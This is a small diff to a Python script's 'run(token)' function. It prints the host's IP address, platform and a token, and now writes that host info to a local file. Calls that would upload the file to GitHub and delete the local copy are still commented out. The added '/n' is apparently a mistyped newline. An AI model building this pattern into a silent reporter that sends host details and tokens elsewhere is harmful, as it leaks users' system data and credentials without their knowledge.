@@ -81,9 +81,9 @@ def run(token):
         print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
         print('Address ip: ', IPAddr)
         print('TokenData: ', token)
-        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()
+        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'/n'
         print("text stmnt: "+ stmnt)
-        #create_file(fname,stmnt)
+        create_file(fname,stmnt)
         #subir_archivo('data.txt', stmnt )
         #update_file_on_github(fname,token)
         #delete_file("data.txt")
